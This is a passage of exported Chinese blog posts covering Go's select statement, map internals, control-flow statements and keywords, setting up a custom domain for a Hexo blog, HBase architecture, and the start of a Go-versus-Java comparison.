如上文所说，非阻塞式其实就是使用 select-case 来实现，在编译时将会被编译为 if-else。 如： 1234567select {case v = &lt;-c: ...foodefault: ...bar}123456 就会被编译为： 123456if selectnbrecv(&amp;v, c) { ...foo} else { ...bar}12345 至于其中的 selectnbrecv 相关的函数简单地调 runtime.chanrecv 函数，设置了一个参数，告诉 runtime.chanrecv 函数，当不能完成操作时不要阻塞，而是返回失败。 但是 select 中的 case 的执行顺序是随机的，而不像 switch 中的 case 那样一条一条的顺序执行。让每一个 select 都对应一个 Select 结构体。在 Select 数据结构中有个 Scase 数组，记录下了每一个 case，而 Scase 中包含了 Hchan。然后 pollorder 数组将元素随机排列，这样就可以将 Scase 乱序了。 # 3.11 map map 表的底层原理是哈希表，其结构体定义如下： 123456789type Map struct { Key *Type // Key type Elem *Type // Val (elem) type Bucket *Type // 哈希桶 Hmap *Type // 底层使用的哈希表元信息 Hiter *Type // 用于遍历哈希表的迭代器}12345678 其中的 Hmap 的具体化数据结构如下： 12345678910111213141516type hmap struct { // Note: the format of the hmap is also encoded in cmd/compile/internal/gc/reflect.go. // Make sure this stays in sync with the compiler's definition. count int // map目前的元素数目 flags uint8 // map状态（正在被遍历/正在被写入） B uint8 // 哈希桶数目以2为底的对数（哈希桶的数目都是 2 的整数次幂，用位运算来计算取余运算的值, 即 N mod M = N &amp; (M-1))） noverflow uint16 //溢出桶的数目, 这个数值不是恒定精确的, 当其 B&gt;=16 时为近似值 hash0 uint32 // 随机哈希种子 buckets unsafe.Pointer // 指向当前哈希桶的指针 oldbuckets unsafe.Pointer // 扩容时指向旧桶的指针 nevacuate uintptr // 桶进行调整时指示的搬迁进度 extra *mapextra // 表征溢出桶的变量}123456789101112131415 以上 hmap 基本都是涉及到了哈希桶和溢出桶，我们首先看一下它的数据结构，如下： 12345678type bmap struct { topbits [8]uint8 // 键哈希值的高8位 keys [8]keytype // 哈希桶中所有键 elems [8]elemtype // 哈希桶中所有值 //pad uintptr(新的 go 版本已经移除了该字段, 我未具体了解此处的 change detail, 之前设置该字段是为了在 nacl/amd64p32 上的内存对齐) overflow uintptr}1234567 我们会发现哈希桶 bmap 一般指定其能保存 8 个键值对，如果多于 8 个键值对，就会申请新的 buckets，并将其于之前的 buckets 链接在一起。 其中的联系如图所示： 在具体插入时，首先会根据 key 值采用相应的 hash 算法计算对应的哈希值，将哈希值的低 8 位作为 Hmap 结构体中 buckets 数组的索引，找到 key 值所对应的 bucket，将哈希值的高 8 位催出在 bucket 的 tophash 中。 特点如下： map 是无序的（原因为无序写入以及扩容导致的元素顺序发生变化），每次打印出来的 map 都会不一样，它不能通过 index 获取，而必须通过 key 获取 map 的长度是不固定的，也就是和 slice 一样，也是一种引用类型 内置的 len 函数同样适用于 map，返回 map 拥有的 key 的数量 map 的 key 可以是所有可比较的类型，如布尔型、整数型、浮点型、复杂型、字符串型…… 也可以键。 如下方式即可进行初始化： 12var a map[keytype]valuetype1 类型名 意义 a map 表名字 keytype 键类型 valuetype 键对应的值的类型 除此以外还可以使用 make 进行初始化，代码如下： 12map_variable = make(map[key_data_type]value_data_type)1 我们还可以使用初始值进行初始化，如下： 12var m map[string]int = map[string]int{&quot;hunter&quot;:12,&quot;tony&quot;:10}1 # 3.11.1 插入数据 map 的数据插入代码如下： 12map_variable[&quot;mars&quot;] = 271 插入过程如下： 根据 key 值计算出哈希值 取哈希值低位和 hmap.B 取模确定 bucket 位置 查找该 key 是否已经存在，如果存在则直接更新值 如果没有找到 key，则将这一对 key-value 插入 # 3.11.2 删除数据 delete(map, key) 函数用于删除集合的元素，参数为 map 和其对应的 key。删除函数不返回任何值。相关代码如下： 1234 countryCapitalMap := map[string] string {&quot;France&quot;:&quot;Paris&quot;,&quot;Italy&quot;:&quot;Rome&quot;,&quot;Japan&quot;:&quot;Tokyo&quot;,&quot;India&quot;:&quot;New Delhi&quot;} /* 删除元素 */ delete(countryCapitalMap,&quot;France&quot;);123 # 3.11.3 查找数据 通过 key 获取 map 中对应的 value 值。语法为： map[key] . 但是当 key 如果不存在的时候，我们会得到该 value 值类型的默认值，比如 string 类型得到空字符串，int 类型得到 0。但是程序不会报错。 所以我们可以使用 ok-idiom 获取值，如下： value, ok := map[key] ，其中的 value 是返回值，ok 是一个 bool 值，可知道 key/value 是否存在。 在 map 表中的查找过程如下： 查找或者操作 map 时，首先 key 经过 hash 函数生成 hash 值 通过哈希值的低 8 位来判断当前数据属于哪个桶 找到桶之后，通过哈希值的高八位与 bucket 存储的高位哈希值循环比对 如果相同就比较刚才找到的底层数组的 key 值，如果 key 相同，取出 value 如果高八位 hash 值在此 bucket 没有，或者有，但是 key 不相同，就去链表中下一个溢出 bucket 中查找，直到查找到链表的末尾 如果查找不到，也不会返回空值，而是返回相应类型的 0 值。 # 3.11.4 扩容 哈希表就是以空间换时间，访问速度是直接跟填充因子相关的，所以当哈希表太满之后就需要进行扩容。 如果扩容前的哈希表大小为 2B 扩容之后的大小为 2 (B+1)，每次扩容都变为原来大小的两倍，哈希表大小始终为 2 的指数倍，则有 (hash mod 2B) 等价于 (hash &amp; (2B-1))。这样可以简化运算，避免了取余操作。 触发扩容的条件？ 负载因子 (负载因子 = 键数量 /bucket 数量) &gt; 6.5 时，也即平均每个 bucket 存储的键值对达到 6.5 个。 溢出桶（overflow）数量 &gt; 2^15 时，也即 overflow 数量超过 32768 时。 什么是增量扩容呢？ 如果负载因子 &gt; 6.5 时，进行增量扩容。这时会新建一个桶（bucket），新的 bucket 长度是原来的 2 倍，然后旧桶数据搬迁到新桶。每个旧桶的键值对都会分流到两个新桶中 主要是缩短 map 容器的响应时间。假如我们直接将 map 用作某个响应实时性要求非常高的 web 应用存储，如果不采用增量扩容，当 map 里面存储的元素很多之后，扩容时系统就会卡往，导致较长一段时间内无法响应请求。不过增量扩容本质上还是将总的扩容时间分摊到了每一次哈希操作上面。 什么是等量扩容？它的触发条件是什么？进行等量扩容后的优势是什么？ 等量扩容，就是创建和旧桶数目一样多的新桶，然后把原来的键值对迁移到新桶中，重新做一遍类似增量扩容的搬迁动作。 触发条件：负载因子没超标，溢出桶较多。这个较多的评判标准为： 如果常规桶数目不大于 2^15，那么使用的溢出桶数目超过常规桶就算是多了； 如果常规桶数目大于 215，那么使用溢出桶数目一旦超过 215 就算多了。 这样做的目的是把松散的键值对重新排列一次，能够存储的更加紧凑，进而减少溢出桶的使用，以使 bucket 的使用率更高，进而保证更快的存取。 # 4. 常用语句及关键字 接下来我们了解一下关于 go 语言语句的基本内容。 # 4.1 条件语句 和 c 语言类似，相关的条件语句如下表所示： 语句 描述 if 语句 if 语句 由一个布尔表达式后紧跟一个或多个语句组成。 if…else 语句 if 语句 后可以使用可选的 else 语句，else 语句中的表达式在布尔表达式为 false 时执行。 switch 语句 switch 语句用于基于不同条件执行不同动作。 select 语句 select 语句类似于 switch 语句，但是 select 会随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。 if 语句 语法如下： 1234if 布尔表达式 { /* 在布尔表达式为 true 时执行 */}123 if-else 语句 123456if 布尔表达式 { /* 在布尔表达式为 true 时执行 */} else { /* 在布尔表达式为 false 时执行 */}12345 switch 语句 其中的变量 v 可以是任何类型， val1 和 val2 可以是同类型的任意值，类型不局限为常量或者整数，或者最终结果为相同类型的表达式。 123456789switch v { case val1: ... case val2: ... default: ...}12345678 select 语句 select 是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。它将会随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。 12345678910select { case communication clause : statement(s); case communication clause : statement(s); /* 你可以定义任意数量的 case */ default : /* 可选 */ statement(s);}123456789 注意： 每个 case 必须都是一个通信 所有 channel 表达式都会被求值，所有被发送的表达式都会被求值 如果任意某一个通信都可以，它就执行，其他就忽略 如果有多个 case 都可以运行，select 就会随机挑选一个来执行。 如果没有一个 case 可以被运行：如果有 default 子句，就执行 default 子句，select 将被阻塞，直到某个通信可以运行，从而避免饥饿问题。 # 4.2 循环语句 # 4.2.1 循环处理语句 go 中时使用 for 实现循环的，共有三种形式： 语法 和 c 语言中的 for 相同 for init; condition; post {} 和 c 语言中的 while 相同 for condition{} 和 c 语言中的 for(;;) 相同 for{} 除此以外，for 循环还可以直接使用 range 对 slice、map、数组以及字符串等进行迭代循环，格式如下： 1234for key, value := range oldmap { newmap[key] = value}123 # 4.2.1 循环控制语句 控制语句 详解 break 中断跳出循环或者 switch 语句 continue 跳过当前循环的剩余语句，然后继续下一轮循环 goto 语句 将控制转移到被标记的语句 break break 主要用于循环语句跳出循环，和 c 语言中的使用方式是相同的。且在多重循环的时候还可以使用 label 标出想要 break 的循环。 实例代码如下： 1234567891011121314a := 0for a&lt;5 { fmt.Printf(&quot;%d\\n&quot;, a) a++ if a==2 { break; }}/* output012*/12345678910111213 continue Go 语言的 continue 语句 有点像 break 语句。但是 continue 不是跳出循环，而是跳过当前循环执行下一次循环语句。在多重循环中，可以用标号 label 标出想 continue 的循环。 实例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445 // 不使用标记 fmt.Println(&quot;---- continue ---- &quot;) for i := 1; i &lt;= 3; i++ { fmt.Printf(&quot;i: %d\\n&quot;, i) for i2 := 11; i2 &lt;= 13; i2++ { fmt.Printf(&quot;i2: %d\\n&quot;, i2) continue } }/* outputi: 1i2: 11i2: 12i2: 13i: 2i2: 11i2: 12i2: 13i: 3i2: 11i2: 12i2: 13*/ // 使用标记 fmt.Println(&quot;---- continue label ----&quot;) re: for i := 1; i &lt;= 3; i++ { fmt.Printf(&quot;i: %d&quot;, i) for i2 := 11; i2 &lt;= 13; i2++ { fmt.Printf(&quot;i2: %d\\n&quot;, i2) continue re } }/* outputi: 1i2: 11i: 2i2: 11i: 3i2: 11*/1234567891011121314151617181920212223242526272829303132333435363738394041424344 goto goto 语句主要是无条件转移到过程中指定的行。goto 语句通常和条件语句配合使用，可用来实现条件转移、构成循环以及跳出循环体等功能。但是并不主张使用 goto 语句，以免造成程序流程混乱。 示例代码如下： 12345678910111213141516171819var a int = 0LOOP: for a&lt;5 { if a == 2 { a = a+1 goto LOOP } fmt.Printf(&quot;%d\\n&quot;, a) a++}/*output:01234*/123456789101112131415161718 以上代码中的 LOOP 就是一个标签，当运行到 goto 语句的时候，此时执行流就会跳转到 LOOP 标志的哪一行上。 # 4.3 关键字 我们这一部分直接列表供大家了解 go 中的关键字如下： 关键字 用法 import 导入相应的包文件 package 创建包文件，用于标记该文件归属哪个包 chan channal，通道 var 变量控制，用于简短声明定义变量（:= 符号只能在函数内部使用，不能全局使用） const 常量声明，任何时候 const 和 var 都可以同时出现 func 定义函数和方法 interface 接口，是一种具有一组方法的类型，这些方法定义了 interface 的行为 map 哈希表 struct 定义结构体 type 声明类型，取别名 for for 是 go 中唯一的循环结构，上文中已经介绍过它的用法 break 中止，跳出循环 continue 继续下一轮循环 select 选择流程，可以同时等待多个通道操作 switch 多分枝选择，上文中已经详细介绍过它的用法 case 和 switch 配套使用 default 用于选择结构的默认选型 defer 用于资源释放，会在函数返回之前进行调用 if 分支选择 else 和 if 配套使用 go 通过 go func() 来开启一个 goroutine goto 跳转至标志点的代码块，不推荐使用 fallthrouth range 用于遍历 slice 类型数据 return 用于标注函数返回值 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/05/17/%E3%80%90Go%E3%80%91Go%E8%AF%AD%E8%A8%80%E8%B6%85%E5%85%A8%E8%AF%A6%E8%A7%A3(%E5%85%A5%E9%97%A8%E7%BA%A7)/"},{"title":"【HEXO】使用Hexo搭建属于自己的博客","text":"# 【HEXO】使用 Hexo 搭建属于自己的博客 目录 一、查询当前博客发布地址 二、域名注册 1、这里博主以阿里云为例，首先进入阿里云官网，登录账号 2、点击搜索按钮，搜索栏输入域名，点击搜索 3、点击域名注册 4、在搜索栏输入想要的域名，这里以 “wanwang” 举例，点击查询域名 5、购买域名 6、购买完成后，返回查询域名页面，点击管理我的域名 7、找到刚刚购买的域名，点击解析 8、点击添加记录 9、添加记录 10、设置成功后，等待状态变为正常即可 11、设置自定义域名 三、完成 1、访问刚才设置好的域名，“http:// 域名”，出现博客页面，表示成功。 # 一、查询当前博客发布地址 1、登录 GitHub，找到仓库（一般以 “.github.io” 结尾），点击进入 2、右上方点击 “Settings”, 左下方找到 “Pages” 点击后，蓝色字体为博客发布的网址，点击查看，网址一般为 “https:// 仓库名 /” # 二、域名注册 注：博主这里提供国内域名商的官网，仅供参考！ 阿里云网址 阿里云 - 上云就上阿里云https://www.aliyun.com/ 华为云网址 最新优惠活动_云服务器特惠促销_打折云产品专场_特价低至 1 折 - 华为云https://activity.huaweicloud.com/ 腾讯云网址 腾讯云 - 产业智变 云启未来https://cloud.tencent.com/ # 1、这里博主以阿里云为例，首先进入阿里云官网，登录账号 # 2、点击搜索按钮，搜索栏输入域名，点击搜索 # 3、点击域名注册 # # 4、在搜索栏输入想要的域名，这里以 “wanwang” 举例，点击查询域名 # 5、购买域名 搜索结果，可能出现已注册情况，建议选择未注册的域名，点击购买，各位朋友请根据自己的需求和自身的经济实力购买，域名没有永久的都是有时效性的，具体可以询问客服 # 6、购买完成后，返回查询域名页面，点击管理我的域名 # 7、找到刚刚购买的域名，点击解析 # 8、点击添加记录 # 9、添加记录 # 10、设置成功后，等待状态变为正常即可 # 11、设置自定义域名 右上方点击 “Settings”，左下方找到 “Pages” 点击后，在 “Custom domain”（自定义域名）下方文本栏中填写域名，勾选 “Enforce HTTPS”（强制使用 https 协议），点击 “Save”（保存），蓝色字体为博客发布的网址，点击查看，网址一般为 “https:// 域名 /” # 三、完成 # 1、访问刚才设置好的域名，“http:// 域名”，出现博客页面，表示成功。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/12/09/%E3%80%90HEXO%E3%80%91%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"},{"title":"Hbase","text":"# 介绍： ​ Hbase 是 bigtable 的开源山寨版本。是建立在 HDFS 之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。它介于 nosql 和 RDBMS 之间，仅能通过主键 (row key) 和主键的 range 来检索数据，仅支持单行事务 (可通过 hive 支持来实现多表 join 等复杂操作)。主要用来存储非结构化和半结构化的松散数据。与 hadoop 一样，Hbase 目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。 # 特点： ​ HBase 中的表一般有这样的特点： 大：一个表可以有上亿行，上百万列 面向列：面向列 (族) 的存储和权限控制，列 (族) 独立检索。 稀疏：对于为空 (null) 的列，并不占用存储空间，因此，表可以设计的非常稀疏。 下面一幅图是 Hbase 在 Hadoop Ecosystem 中的位置。 # 二、 逻辑视图 HBase 以表的形式存储数据。表有行和列组成。列划分为若干个列族 (row family) Row Key 与 nosql 数据库们一样，row key 是用来检索记录的主键。访问 hbase table 中的行，只有三种方式： 1 通过单个 row key 访问 2 通过 row key 的 range 3 全表扫描 Row key 行键 (Row key) 可以是任意字符串 (最大长度是 64KB，实际应用中长度一般为 10-100bytes)，在 hbase 内部，row key 保存为字节数组。 存储时，数据按照 Row key 的字典序 (byte order) 排序存储。设计 key 时，要充分排序存储这个特性，将经常一起读取的行存储放到一起。(位置相关性) 注意： 字典序对 int 排序的结果是 1,10,100,11,12,13,14,15,16,17,18,19,2,20,21,…,9,91,92,93,94,95,96,97,98,99。要保持整形的自然序，行键必须用 0 作左填充。 行的一次读写是原子操作 (不论一次读写多少列)。这个设计决策能够使用户很容易的理解程序在对同一个行进行并发更新操作时的行为。 列族 hbase 表中的每个列，都归属与某个列族。列族是表的 chema 的一部分 (而列不是)，必须在使用表之前定义。列名都以列族作为前缀。例如 courses:history ， courses:math 都属于 courses 这个列族。 访问控制、磁盘和内存的使用统计都是在列族层面进行的。实际应用中，列族上的控制权限能 帮助我们管理不同类型的应用：我们允许一些应用可以添加新的基本数据、一些应用可以读取基本数据并创建继承的列族、一些应用则只允许浏览数据（甚至可能因 为隐私的原因不能浏览所有数据）。 时间戳 HBase 中通过 row 和 columns 确定的为一个存贮单元称为 cell。每个 cell 都保存着同一份数据的多个版本。版本通过时间戳来索引。时间戳的类型是 64 位整型。时间戳可以由 hbase (在数据写入时自动) 赋值，此时时间戳是精确到毫秒的当前系统时间。时间戳也可以由客户显式赋值。如果应用程序要避免数据版本冲突，就必须自己生成具有唯一性的时间戳。每个 cell 中，不同版本的数据按照时间倒序排序，即最新的数据排在最前面。 为了避免数据存在过多版本造成的的管理 (包括存贮和索引) 负担，hbase 提供了两种数据版本回收方式。一是保存数据的最后 n 个版本，二是保存最近一段时间内的版本（比如最近七天）。用户可以针对每个列族进行设置。 Cell 由 *{row key, column (* = + ), version} 唯一确定的单元。cell 中的数据是没有类型的，全部是字节码形式存贮。 # 三、 物理存储 1 . 已经提到过，Table 中的所有行都按照 row key 的字典序排列。 2 . Table 在行的方向上分割为多个 Hregion。 3 . region 按大小分割的，每个表一开始只有一个 region，随着数据不断插入表，region 不断增大，当增大到一个阀值的时候，Hregion 就会等分会两个新的 Hregion。当 table 中的行不断增多，就会有越来越多的 Hregion。 4 . Hregion 是 Hbase 中分布式存储和负载均衡的最小单元。最小单元就表示不同的 Hregion 可以分布在不同的 HRegion server 上。但一个 Hregion 是不会拆分到多个 server 上的。 5 . HRegion 虽然是分布式存储的最小单元，但并不是存储的最小单元。 事实上，HRegion 由一个或者多个 Store 组成，每个 store 保存一个 columns family。 每个 Strore 又由一个 memStore 和 0 至多个 StoreFile 组成。如图： StoreFile 以 HFile 格式保存在 HDFS 上。 HFile 的格式为： Trailer 部分的格式: HFile 分为六个部分： Data Block 段–保存表中的数据，这部分可以被压缩 Meta Block 段 (可选的)–保存用户自定义的 kv 对，可以被压缩。 File Info 段–Hfile 的元信息，不被压缩，用户也可以在这一部分添加自己的元信息。 Data Block Index 段–Data Block 的索引。每条索引的 key 是被索引的 block 的第一条记录的 key。 Meta Block Index 段 (可选的)–Meta Block 的索引。 Trailer–这一段是定长的。保存了每一段的偏移量，读取一个 HFile 时，会首先 读取 Trailer，Trailer 保存了每个段的起始位置 (段的 Magic Number 用来做安全 check)，然后，DataBlock Index 会被读取到内存中，这样，当检索某个 key 时，不需要扫描整个 HFile，而只需从内存中找到 key 所在的 block，通过一次磁盘 io 将整个 block 读取到内存中，再找到需要的 key。DataBlock Index 采用 LRU 机制淘汰。 HFile 的 Data Block，Meta Block 通常采用压缩方式存储，压缩之后可以大大减少网络 IO 和磁盘 IO，随之而来的开销当然是需要花费 cpu 进行压缩和解压缩。 目标 Hfile 的压缩支持两种方式：Gzip，Lzo。 HLog(WAL log) WAL 意为 Write ahead log (http://en.wikipedia.org/wiki/Write-ahead_logging)，类似 mysql 中的 binlog, 用来 做灾难恢复只用，Hlog 记录数据的所有变更，一旦数据修改，就可以从 log 中进行恢复。 每个 Region Server 维护一个 Hlog, 而不是每个 Region 一个。这样不同 region (来自不同 table) 的日志会混在一起，这样做的目的是不断追加单个 文件相对于同时写多个文件而言，可以减少磁盘寻址次数，因此可以提高对 table 的写性能。带来的麻烦是，如果一台 region server 下线，为了恢复其上的 region，需要将 region server 上的 log 进行拆分，然后分发到其它 region server 上进行恢复。 HLog 文件就是一个普通的 Hadoop Sequence File，Sequence File 的 Key 是 HLogKey 对象，HLogKey 中记录了写入数据的归属信息，除了 table 和 region 名字外，同时还包括 sequence number 和 timestamp，timestamp 是” 写入时间”，sequence number 的起始值为 0，或者是最近一次存入文件系统中 sequence number。HLog Sequece File 的 Value 是 HBase 的 KeyValue 对象，即对应 HFile 中的 KeyValue，可参见上文描述。 # 四、 系统架构 Client 1 包含访问 hbase 的接口，client 维护着一些 cache 来加快对 hbase 的访问，比如 regione 的位置信息。 Zookeeper 1 保证任何时候，集群中只有一个 master 2 存贮所有 Region 的寻址入口。 3 实时监控 Region Server 的状态，将 Region server 的上线和下线信息实时通知给 Master 4 存储 Hbase 的 schema, 包括有哪些 table，每个 table 有哪些 column family Master 1 为 Region server 分配 region 2 负责 region server 的负载均衡 3 发现失效的 region server 并重新分配其上的 region 4 GFS 上的垃圾文件回收 5 处理 schema 更新请求 Region Server 1 Region server 维护 Master 分配给它的 region，处理对这些 region 的 IO 请求 2 Region server 负责切分在运行过程中变得过大的 region 可以看到，client 访问 hbase 上数据的过程并不需要 master 参与（寻址访问 zookeeper 和 region server，数据读写访问 regione server），master 仅仅维护者 table 和 region 的元数据信息，负载很低。 # 五、关键算法 / 流程 region 定位 系统如何找到某个 row key (或者某个 row key range) 所在的 region bigtable 使用三层类似 B + 树的结构来保存 region 位置。 第一层是保存 zookeeper 里面的文件，它持有 root region 的位置。 第二层 root region 是.META. 表的第一个 region 其中保存了.META.z 表其它 region 的位置。通过 root region，我们就可以访问.META. 表的数据。 .META. 是第三层，它是一个特殊的表，保存了 hbase 中所有数据表的 region 位置信息。 说明： 1 root region 永远不会被 split，保证了最需要三次跳转，就能定位到任意 region 。 2.META. 表每行保存一个 region 的位置信息，row key 采用表名 + 表的最后一样编码而成。 3 为了加快访问，.META. 表的全部 region 都保存在内存中。 假设，.META. 表的一行在内存中大约占用 1KB。并且每个 region 限制为 128MB。 那么上面的三层结构可以保存的 region 数目为： (128MB/1KB) * (128MB/1KB) = = 2 (34) 个 region 4 client 会将查询过的位置信息保存缓存起来，缓存不会主动失效，因此如果 client 上的缓存全部失效，则需要进行 6 次网络来回，才能定位到正确的 region (其中三次用来发现缓存失效，另外三次用来获取位置信息)。 读写过程 上文提到，hbase 使用 MemStore 和 StoreFile 存储对表的更新。 数据在更新时首先写入 Log (WAL log) 和内存 (MemStore) 中，MemStore 中的数据是排序的，当 MemStore 累计到一定阈值时，就会创建一个新的 MemStore，并 且将老的 MemStore 添加到 flush 队列，由单独的线程 flush 到磁盘上，成为一个 StoreFile。于此同时，系统会在 zookeeper 中 记录一个 redo point，表示这个时刻之前的变更已经持久化了。(minor compact) 当系统出现意外时，可能导致内存 (MemStore) 中的数据丢失，此时使用 Log (WAL log) 来恢复 checkpoint 之后的数据。 前面提到过 StoreFile 是只读的，一旦创建后就不可以再修改。因此 Hbase 的更 新其实是不断追加的操作。当一个 Store 中的 StoreFile 达到一定的阈值后，就会进行一次合并 (major compact), 将对同一个 key 的修改合并到一起，形成一个大的 StoreFile，当 StoreFile 的大小达到一定阈值后，又会对 StoreFile 进行 split，等分为两个 StoreFile。 由于对表的更新是不断追加的，处理读请求时，需要访问 Store 中全部的 StoreFile 和 MemStore，将他们的按照 row key 进行合并，由于 StoreFile 和 MemStore 都是经过排序的，并且 StoreFile 带有内存中索引，合并的过程还是比较快。 写请求处理过程 1 client 向 region server 提交写请求 2 region server 找到目标 region 3 region 检查数据是否与 schema 一致 4 如果客户端没有指定版本，则获取当前系统时间作为数据版本 5 将更新写入 WAL log 6 将更新写入 Memstore 7 判断 Memstore 的是否需要 flush 为 Store 文件。 region 分配 任何时刻，一个 region 只能分配给一个 region server。master 记录了当前有哪些可用的 region server。以及当前哪些 region 分配给了哪些 region server，哪些 region 还没有分配。当存在未分配的 region，并且有一个 region server 上有可用空间时，master 就给这个 region server 发送一个装载请求，把 region 分配给这个 region server。region server 得到请求后，就开始对此 region 提供服务。 region server 上线 master 使用 zookeeper 来跟踪 region server 状态。当某个 region server 启动时，会首先在 zookeeper 上的 server 目录下建立代表自己的文件，并获得该文件的独占锁。由于 master 订阅了 server 目录上的变更消息，当 server 目录下的文件出现新增或删除操作时，master 可以得到来自 zookeeper 的实时通知。因此一旦 region server 上线，master 能马上得到消息。 region server 下线 当 region server 下线时，它和 zookeeper 的会话断开，zookeeper 而自动释放代表这台 server 的文件上的独占锁。而 master 不断轮询 server 目录下文件的锁状态。如果 master 发现某个 region server 丢失了它自己的独占锁，(或者 master 连续几次和 region server 通信都无法成功),master 就是尝试去获取代表这个 region server 的读写锁，一旦获取成功，就可以确定： 1 region server 和 zookeeper 之间的网络断开了。 2 region server 挂了。 的其中一种情况发生了，无论哪种情况，region server 都无法继续为它的 region 提供服务了，此时 master 会删除 server 目录下代表这台 region server 的文件，并将这台 region server 的 region 分配给其它还活着的同志。 如果网络短暂出现问题导致 region server 丢失了它的锁，那么 region server 重新连接到 zookeeper 之后，只要代表它的文件还在，它就会不断尝试获取这个文件上的锁，一旦获取到了，就可以继续提供服务。 master 上线 master 启动进行以下步骤: 1 从 zookeeper 上获取唯一一个代码 master 的锁，用来阻止其它 master 成为 master。 2 扫描 zookeeper 上的 server 目录，获得当前可用的 region server 列表。 3 和 2 中的每个 region server 通信，获得当前已分配的 region 和 region server 的对应关系。 4 扫描.META.region 的集合，计算得到当前还未分配的 region，将他们放入待分配 region 列表。 master 下线 由于 master 只维护表和 region 的元数据，而不参与表数据 IO 的过 程，master 下线仅导致所有元数据的修改被冻结 (无法创建删除表，无法修改表的 schema，无法进行 region 的负载均衡，无法处理 region 上下线，无法进行 region 的合并，唯一例外的是 region 的 split 可以正常进行，因为只有 region server 参与)，表的数据读写还可以正常进行。因此 master 下线短时间内对整个 hbase 集群没有影响。从上线过程可以看到，master 保存的 信息全是可以冗余信息（都可以从系统其它地方收集到或者计算出来），因此，一般 hbase 集群中总是有一个 master 在提供服务，还有一个以上 的’master’在等待时机抢占它的位置。 六、访问接口 HBase Shell Java clietn API HBase non-java access languages talking to the JVM Jython interface to HBase Groovy DSL for HBase Scala interface to HBase languages with a custom protocol REST gateway specification for HBase 充分利用 HTTP 协议：GET POST PUT DELETE § text/plain text/xml application/json application/x-protobuf Thrift gateway specification for HBase java cpp rb py perl php HBase Map Reduce Hive/Pig # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/08/04/%E3%80%90Hbase%E3%80%91Hbase%E5%AD%A6%E4%B9%A0/"},{"title":"【Go】Go语言与Java语言对比","text":"# 【Go】Go 语言与 Java 语言对比 # Go 与 Java # 零.GoApi 文档和中文社区网址 Go 的中文 api 文档：https://studygolang.com/pkgdoc Go 中文社区网站：https://studygolang.com/ # 一。关于 Java # 1.Java 的用途 1234567 首先我们来回顾下Java的主要用途和应用场景：1 用途一：服务器后端系统开发(web后端、微服务后端支付系统、业务系统、管理后台，各种后台交互的接口服务)。 用途二：大数据框架的底层实现和Java的API支持。(Hadoop)。 用途三：其它中间件的底层开发。(Tomcat、RocketMq、Hbase、Kafka(部分)、SpringCloud，Dubbo...)。 # 2.Java 的优势和特点 123456789 那我们看Java语言有什么优势和特点呢？1 *.做服务端系统性能高。 *.有虚拟机，跨平台。 *.功能强大，支持的类库多，生态圈类库多，开发框架和工具更易找。 *.市场占有率高，约60%的中国程序员都是做Java相关的工作。 # 二。关于 Go # 1.Go 的出生原因 123Go语言是Google内部公司大佬开发的，主要起因于Google公司有大量的C程序项目，但是开发起来效率太低，维护成本高，于是就开发了Go语言来提高效率，而且性能只是差一点。（Go是2007年开始研发，2009推出发布） # 2. 宏观看 Go 与 Java 的差异 1234567891011 接着，我们来看一下Go语言与Java的差异之处：1 *.无虚拟机，不跨平台(这里的平台指操作系统)(可以运行多个平台，每个平台打不同的二进制程序包)，需要打包编译成对应服务器操作系统版本(windows/linux)的可执行程序(比如windows是exe)。(注:说go跨平台的是指32位和64位相同操作系统之间的跨平台) *.因为Go程序直接打包成操作系统可执行的文件，没有虚拟机在中间转换的一层，所以理论上执行效率会更高（理论上更高，实际情况需具体分析)。 *.相比Java的语言和代码编写风格，Go更简洁，可以用更少的代码实现同样的功能。 *.Go语言底层也是C实现的，又做了高并发的设计(Java出生时(1995)还没有多核cpu,所以他的并发支持后来添加上去的,Go(2009)出生时已经有了多核cpu的电脑，它在设计语言时就考虑了充分利用多核cpu(英特尔2005首次推出多核)的性能)，所以性能高，高并发的支持(高并发支持其中指的一个就是充分利用多核cpu的性能资源，比如go程序默认使用所有cpu(除非自己设置使用多少))也好。 *.天然的适用一些特定系统的开发，比如区块链类系统(如以太坊底层系统、以太坊上层应用程序)，云计算和容器（Docker，K8s底层都是go开发的）开发的(大公司自研运维管理项目也大多是用go做底层的开发)，网络编程(类似于java的Netty)。 # 3.Go 和 Java 的语言类型区别 计算机编程语言按照运行的方式可以分为编译型编程语言和解释型编译语言。 我来举一个例子，你要教别人一门沟通交流的语言，比如英语。 编译型的教的方式就是录 (这里的录相当于计算机中把程序编译成二进制可执行文件) 一个视频课程，语音课程，把每一句英语发音录下来，这样学生学的时候只要播放你的录音，然后跟着读就行，你只需要录制一次，学生就可以无数次听。 解释性的教的方式就是你亲自到学生家里给他补习，你当面教他，你读 (读相当于每次执行都重新用解释器解释一遍) 一句他学一句， 这样的话，你想要教他一句你必须就得先读一句，每次教都得重新一遍一遍的读。 这两种教学方式还有一个差别，你录 (编译) 视频语音教他，你录的英语他就只能学英语，空间环境一变，他现在要去日本，要学日语，你的视频语音教程因为已经录好了，是英语类型 (英语类型类比操作系统类型) 的，所以，你就得再录一套日语的语音教程。 而现场教他，你也会日语的话，你只需要读 (读相当于解释器解释) 日语给他听，让他学就行了，是不用考虑语言环境 (操作系统类型环境) 不同的问题的。 